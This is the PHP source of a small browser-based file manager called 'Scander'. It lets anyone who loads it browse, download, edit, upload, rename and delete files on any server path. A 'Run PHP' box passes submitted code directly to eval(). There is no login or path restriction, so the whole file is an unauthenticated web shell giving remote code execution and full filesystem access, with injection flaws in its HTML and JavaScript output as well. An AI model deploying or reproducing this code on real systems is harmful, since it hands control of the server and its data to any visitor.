<?php

// change php.ini settings
ini_set('memory_limit', '1024M');
ini_set('max_execution_time', '0');
ini_set('register_globals', 'Off');

ob_start();

// generic functions
function gpc($str) {
	if (get_magic_quotes_gpc()) return stripslashes($str);
	return $str;
}
function html($str) {
	return htmlentities($str);
}
function url($str) {
	return $str;
}

// set up some variables
$subject = isset($_GET['s']) ? realpath(gpc($_GET['s'])) : realpath(dirname($_SERVER['SCRIPT_FILENAME']));
if (!$subject) $subject = gpc($_GET['s']);
$action = isset($_GET['action']) ? strtolower(gpc($_GET['action'])) : 'dir';
$thisDir = realpath(is_file($subject) ? dirname($subject) : $subject);
$upDir = realpath("$subject/..");
$value = isset($_REQUEST['v']) ? gpc($_REQUEST['v']) : false;
$highlight = isset($_GET['h']) ? gpc($_GET['h']) : false;


function printDir($dir) {
	global $highlight;
	
	if (is_file($dir)) { // a file was supplied as a directory
		editFile($dir);
		return;
	}
	$entries = @scandir(realpath($dir));
	
	if ($entries === false) {
		echo '<strong>Error:</strong> Cannot open directory.';
		return;
	}
	if (count($entries) <= 2) {
		echo 'Empty directory';
		return;
	}
	
	echo '
<table class="data">
<th>&nbsp;</th><th width="350">Name</th><th width="90">Bytes</th><th width="150">Changed</th><th>&nbsp;</th><th>&nbsp;</th><th>&nbsp;</th>';
	
	foreach ($entries as $z => $i) {
		if (preg_match('/^\.+$/', $i)) continue;
		
		$path = realpath("$dir/$i");
		//$shade = $z % 2 ? '' : ' class="shaded"';
		//$shade = '';
		$shade = strtolower($i) == strtolower($highlight) ? ' class="highlighted"' : '';
		$change = date('j/m/Y g:ia', filectime($path));
		
		if (is_dir($path)) {
			// directory
			
			echo "
<tr$shade id=\"row$z\" onmouseover=\"changeHighlightState(this, true)\" onmouseout=\"changeHighlightState(this, false)\">
	<td><a class=\"icon\" href=\"#\" onclick=\"browseDir(pathFromID($z))\"><font size=\"4\" face=\"Wingdings\">0</font></a></td>
	<td>
		<input type=\"hidden\" id=\"path$z\" value=\"".html($path)."\" />
		<input type=\"hidden\" id=\"filename$z\" value=\"".html($i)."\" />
		<a href=\"#\" onclick=\"browseDir(pathFromID($z))\" id=\"link$z\">".html($i)."</a>
		<form action=\"javascript://\" onsubmit=\"rename($z)\" class=\"compact\">
			<input type=\"text\" id=\"label$z\" class=\"filelabel\" value=\"".html($i)."\" style=\"display: none\" />
		</form>
	</td>
	<td>&nbsp;</td>
	<td>$change</td>
	<td><font face=\"Wingdings\" size=\"4\"><a href=\"javascript://\" class=\"icon\" onclick=\"del(pathFromID($z), filenameFromID($z), true, document.getElementById('row$z'))\"?>û</a></font></td>
	<td><font face=\"Wingdings\" size=\"4\"><a href=\"javascript://\" class=\"icon\" onclick=\"toggleLabelEdit($z)\">`</a></font></td>
	<td>&nbsp;</td>
</tr>
";
		}
		else {
			// file
			
			$size = number_format(filesize($path), 0, '.', ',');
			
			echo "
<tr$shade id=\"row$z\" onmouseover=\"changeHighlightState(this, true)\" onmouseout=\"changeHighlightState(this, false)\">
	<td><a class=\"icon\" href=\"#\" onclick=\"goto('?action=dl&s=' + pathFromID($z))\"><font size=\"4\" face=\"Wingdings\">2</font></a></td>
	<td>
		<input type=\"hidden\" id=\"path$z\" value=\"".html($path)."\" />
		<input type=\"hidden\" id=\"filename$z\" value=\"".html($i)."\" />
		<a href=\"#\" onclick=\"goto('?action=dl&s=' + pathFromID($z))\" id=\"link$z\">".html($i)."</a>
		<form action=\"javascript://\" onsubmit=\"rename($z)\" class=\"compact\">
			<input type=\"text\" id=\"label$z\" class=\"filelabel\" value=\"".html($i)."\" style=\"display: none\" />
		</form>
	</td>
	<td>$size</td>
	<td>$change</td>
	<td><font face=\"Wingdings\" size=\"4\"><a href=\"javascript://\" class=\"icon\" onclick=\"del(pathFromID($z), filenameFromID($z), false, document.getElementById('row$z'))\"?>û</a></font></td>
	<td><font face=\"Wingdings\" size=\"4\"><a href=\"javascript://\" class=\"icon\" onclick=\"toggleLabelEdit($z)\">`</a></font></td>
	<td><font face=\"Webdings\" size=\"4\"><a href=\"#\" onclick=\"goto('?action=edit&s=' + pathFromID($z))\" class=\"icon\">¥</a></font></td>
</tr>
";

		}
	}
	
	echo '</table>';
}

function downloadFile($file) {
	$filename = basename($file);
	if (function_exists('mime_content_type')) {
		$contype = mime_content_type($file);
	} else {
		$contype = 'Unknown';
		header("Content-Disposition: attachment; filename=\"$filename\"");
	}
	header("Content-type: $contype");
	echo file_get_contents($file);
	die;
}

function uploadFile($outdir) {
	$uploadBoxes = '';
	for ($i = 0; $i < 50; $i++) {
		$uploadBoxes .= "\t<span id=\"uploadbox$i\" onclick=\"newUploadBox(this)\" onchange=\"newUploadBox(this)\" style=\"display: none\"><input name=\"upFile[]\" type=\"file\" size=\"60\" /><br /></span>\r\n";
	}
	
	echo '
<h2>Upload Files</h2>';
	if(!isset($_FILES['upFile'])) {
		echo '
<form method="post" enctype="multipart/form-data">
'.$uploadBoxes.'
	<input type="submit" value="Upload" style="font-weight: bold" />
	<input type="button" value="Cancel" onclick="browseDir(\''.addslashes($outdir).'\');" />
</form>
';
	}
	else {
		echo "<ul>\r\n";
		$outdir .= '/';
		$file = $_FILES['upFile'];
		for ($i = 0; $i < count($file['name']); $i++) {
			if (strlen($file['name'][$i]) == 0) continue;
			
			if (@move_uploaded_file($file['tmp_name'][$i], $outdir . $file['name'][$i])) {
				echo "\t<li><b>".html($file['name'][$i])."</b> successfully uploaded.</li>\r\n";
			}
			else {
				echo "\t<li>Uploading <b>".html($file['name'][$i])."</b> failed.</li>\r\n";
			}
		}
		echo '</ul>';
		
		echo "<p><a href=\"javascript:browseDir('".addslashes($outdir)."');\">Return</a></p>";
	}
}

function editFile($filename, $new=false) {
	global $thisDir;
	
	$filename = realpath($filename);
	
	$name = basename($filename);
	$file = $new ? '' : file_get_contents($filename);
	$title = $new ? '<input type="text" id="f" size="89" style="font-size: 1.4em" /><br />' : '<h2>'.html($name).'</h2>
	<input type="hidden" id="f" size="120" value="'.html($filename).'" />';
	$saveArgs = $new ? "'".addslashes($filename)."/' + document.getElementById('f').value, document.getElementById('v').value" : "document.getElementById('f').value, document.getElementById('v').value";
	//$browseArgs = "'.addslashes($thisDir)."', '".addslashes($name).'";
	$browseArgs = "'".addslashes($thisDir)."', ".($new ? "document.getElementById('f').value" : ("'".addslashes($name))."'");

	echo "
$title

<textarea id=\"v\" cols=\"90\" rows=\"25\" onchange=\"setSaveStatus('Unsaved', false)\">".html($file)."</textarea><br />
<input type=\"button\" onclick=\"save($saveArgs);\" value=\"Save\" id=\"saveBtn\" style=\"font-weight: bold\" />
<input type=\"button\" value=\"Exit\" id=\"exitBtn\" onclick=\"browseDir($browseArgs);\" /> <span id=\"saveStatus\"></span>
";
}

function saveFile($filename, $contents) {
	echo file_put_contents($filename, $contents) !== false;
	die;
}

function renameSubject($subject, $newName) {
	$success = @rename($subject, dirname($subject).'/'.$newName);
	$newPath = realpath(dirname($subject).'/'.$newName);
	echo $success ? $newPath : '0';
	die;
}

function deleteSubject($subject) {
	if (is_file($subject)) {
		echo @unlink($subject) ? '1' : '0';
	}
	else if (is_dir($subject)) {
		echo @rmdir($subject) ? '1' : '0';
	}
	else echo false;
	die;
}

function evalBox($command) {
	if ($command === false) {
		echo '
<h2>Run PHP</h2>
<form action="javascript://" onsubmit="execEval()">
	<textarea id="v" cols="80" rows="20"></textarea>
	<br /><input id="evalbtn" type="submit" value="Run" style="font-weight: bold" />
	<input type="button" value="Clear Output" onclick="clearEvalOutput()" />
</form>
<div id="command_output"></div>
';
	}
	else {
		ob_end_clean();
		eval($command);
		die;
	}
}

header('Cache-Control: no-cache');
header('Content-Type: text/html; charset=ISO-8859-1');

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Scander - <?php echo html($subject); ?></title>
<style type="text/css">
body, td {
	font: 80% sans-serif;
}
a {
	text-decoration: none;
}
h2 {
	margin-bottom: 0;
}
hr {
	border: 1px solid #DDD;
	margin: 1em 0;
}

table.data tr.shaded {
	background-color: #EEE;
}
table.data tr.highlighted {
	background-color: #CFD;
}
table.data th {
	text-align: left;
	background-color: white;
}
table.data td {
	padding: 0 0.4em;
}
table.data td a {
	display: block;
	margin: 0;
	padding: 0;
}
table.data td a:hover {
	color: #77F;
}

form.compact {
	display: inline;
	margin: 0;
	padding: 0;
}

input.filelabel {
	font: 100% sans-serif;
	border: 1px solid grey;
	background: white;
	margin: 0;
	width: 100%
}

.icon {
	text-decoration: none;
	display: block;
	color: black;
}
.note {
	color: #555;
	font-size: 0.8em;
}

#nav {
	font-size: 180%;
	margin-bottom: 0.2em;
}
#nav a {
	text-decoration: none;
	color: black;
	background-color: #EEE;
	border: 1px solid #CCC;
	padding: 0 0.3em;
}
#nav a:hover {
	color: #555;
	background-color: #FFF;
}
</style>
<script type="text/javascript">

function init() {
<?php

switch ($action) {
	case 'ul':
		echo "\tnewUploadBox(false);";
		break;
}

?>
}

function newXMLHTTP() {
	try {
		return new XMLHttpRequest();
	}
	catch (e) {
		try {
			return new ActiveXObject("Msxml2.XMLHTTP");
		}
		catch (e) {
			try {
				return new ActiveXObject("Microsoft.XMLHTTP");
			}
			catch (e) {
				return false;
			}
		}
	}
}

function del(path, name, isDir, row) {
		var question = isDir ? "Are you sure you would like to delete the folder \"" + name + "\"?\n\nNOTE: The folder must be empty" : "Are you sure you would like to delete the file \"" + name + "\"?";
	if (confirm(question)) {
		var ajax = newXMLHTTP();
		ajax.onreadystatechange = function() {
			if (ajax.readyState == 4) {
				if (ajax.responseText == "1") {
					row.style.display = "none";
				}
				else {
					alert("Error deleting \"" + name + "\"! The file/folder may no longer exist, is still in use, or is not empty (if a folder).");
					row.style.backgroundColor = "red";
				}
			}
		}
		ajax.open("GET", "?action=del&s=" + encodeURIComponent(path), true);
		ajax.send(null);
	}
	else {
		return false;
	}
}

function save(file, value) {
	var ajax = newXMLHTTP();
	var params = "v=" + encodeURIComponent(value);
	var saveStatus = document.getElementById("saveStatus");
	var filenameBox = document.getElementById("f");
	
	setSaveStatus("Saving...", true);
	ajax.onreadystatechange = function() {
		if (ajax.readyState == 4) {
			if (ajax.responseText == "1") {
				setSaveStatus("Saved", false);
				filenameBox.disabled = true;
			}
			else {
				setSaveStatus("Save failed", false);
			}
			saveBtn.enabled = true;
		}
	}
	ajax.open("POST", "?action=save&s=" + encodeURIComponent(file), true);
	ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	ajax.setRequestHeader("Content-length", params.length);
	ajax.setRequestHeader("Connection", "close");
	ajax.send(params);
}

function setSaveStatus(status, disable) {
	var saveBtn = document.getElementById("saveBtn");
	var exitBtn = document.getElementById("exitBtn");
	
	saveBtn.disabled = exitBtn.disabled = disable;
	saveStatus.innerHTML = status;
}

function browseDir(dir, highlight) {
	if (!highlight) {
		goto("?action=dir&s=" + dir);
	}
	else {
		goto("?action=dir&s=" + dir + "&h=" + highlight);
	}
}

function goto(url) {
	location.href = url;
}

function pathFromID(id) {
	return document.getElementById("path" + id).value;
}
function filenameFromID(id) {
	return document.getElementById("filename" + id).value;
}

function execEval() {
	var ajax = newXMLHTTP();
	var evalBox = document.getElementById("v");
	var params = "v=" + encodeURIComponent(evalBox.value);
	var evalBtn = document.getElementById("evalbtn");
	var comOut = document.getElementById("command_output");

	evalBtn.disabled = true;

	ajax.onreadystatechange = function() {
		if (ajax.readyState == 4) {
			if (ajax.status == 200) {
				comOut.innerHTML += (comOut.innerHTML.length ? "" : "<hr />") + ajax.responseText + "<br />";
			}
			else {
				comOut.innerHTML += "<span style=\"color: red\">Error executing PHP.</font><br />";
			}
			evalBtn.disabled = false;
		}
	}
	ajax.open("POST", "?action=eval", true);
	ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	ajax.setRequestHeader("Content-length", params.length);
	ajax.setRequestHeader("Connection", "close");
	ajax.send(params);
}

function clearEvalOutput() {
	document.getElementById("command_output").innerHTML = "";
}

u = 0;
changedBoxes = [];

function newUploadBox(caller) {
	if (caller) {
		for (i in changedBoxes) {
			if (changedBoxes[i] == caller.id) return;
		}
	changedBoxes.push(caller.id);
	}
	
	uploadBox = document.getElementById("uploadbox" + u++).style.display = "inline";
}

function toggleLabelEdit(id) {
	var label = document.getElementById("label" + id);
	var link = document.getElementById("link" + id);
	var subjectPath = pathFromID(id);
	var editMode = label.style.display != "none";
	var oldValue = link.innerHTML;
	
	label.style.display = !editMode ? "inline" : "none";
	link.style.display = editMode ? "inline" : "none";
	
	if (editMode) {
		label.onblur = null;
		label.onkeypress = null;
	}
	else {
		label.focus();
		label.select();
		
		label.onblur = function() {
			rename(id, subjectPath);
		};
		label.onkeypress = function(e) {
			var keyPressed = window.event ? event.keyCode : e.keyCode;
			if (keyPressed == 27) {
				label.value = oldValue;
				toggleLabelEdit(id, subjectPath);
			}
		};
	}
}

function rename(id) {
	var label = document.getElementById("label" + id);
	var link = document.getElementById("link" + id);
	var subjectPath = pathFromID(id);
	var path = document.getElementById("path" + id);
	var filename = document.getElementById("filename" + id);
	var oldName = link.innerHTML;
	var newName = label.value;
	
	var ajax = newXMLHTTP();
	ajax.onreadystatechange = function() {
		if (ajax.readyState == 4) {
			if (ajax.responseText != "0") {
				path.value = ajax.responseText;
				filename.value = link.innerHTML = newName;
			}
			else {
				alert("Failed to rename \"" + oldName + "\". The file is either in use or another file shares the same name.");
				label.value = oldName;
			}
		}
	}
	ajax.open("GET", "?action=rn&s=" + encodeURIComponent(subjectPath) + "&v=" + encodeURIComponent(newName), true);
	ajax.send(null);

	toggleLabelEdit(id);
}

// row highlighting
function changeHighlightState(row, state) {
	row.style.backgroundColor = state ? "#EEE" : "#FFF";
}

</script>
</head>

<body onload="init()">
<h1>Scander</h1>

<form method="get">
	<input type="hidden" name="action" value="dir" />
	<input type="text" size="90" name="s" value="<?php echo html($subject); ?>" />
	<input type="submit" value="Go" style="font-weight: bold" />
</form>

<div id="nav">
	<a href="javascript:history.go(-1)"><font face="Wingdings">ï</font></a>
	<a href="javascript:history.go(1)"><font face="Wingdings">ð</font></a>
	<a href="?action=dir&s=<?php echo $upDir; ?>"><font face="Wingdings">ñ</font></a>
	<a href="javascript://" onclick="location.reload(true)"><font face="Webdings">q</font></a>
	<a href="?"><font face="Webdings">H</font></a>
	&nbsp;<span style="border-left: 1px solid #CCC; margin">&nbsp;</span>
	<a href="?action=new&s=<?php echo html($thisDir); ?>"><font face="Wingdings">2</font></a>
	<a href="?action=ul&s=<?php echo html($thisDir); ?>"><font face="Webdings">Â</font></a>
	<a href="?action=eval&s=<?php echo html($thisDir); ?>"><span style="font-size: 0.8em">&lt;?</span></a>
</div>
<br />

<?php

// determine action
switch ($action) {
	case 'del':
		ob_clean();
		deleteSubject($subject);
		break;
	case 'dl':
		ob_clean();
		downloadFile($subject);
		break;
	case 'edit':
	case 'new':
		editFile($subject, $action == 'new');
		break;
	case 'rn':
		ob_clean();
		renameSubject($subject, $value);
		break;
	case 'save':
		ob_clean();
		saveFile($subject, $value);
		break;
	case 'eval':
		evalBox($value);
		break;
	case 'ul':
		uploadFile($subject);
		break;
	case 'dir':
		printDir($subject);
		break;
}

?>
</body>
</html>
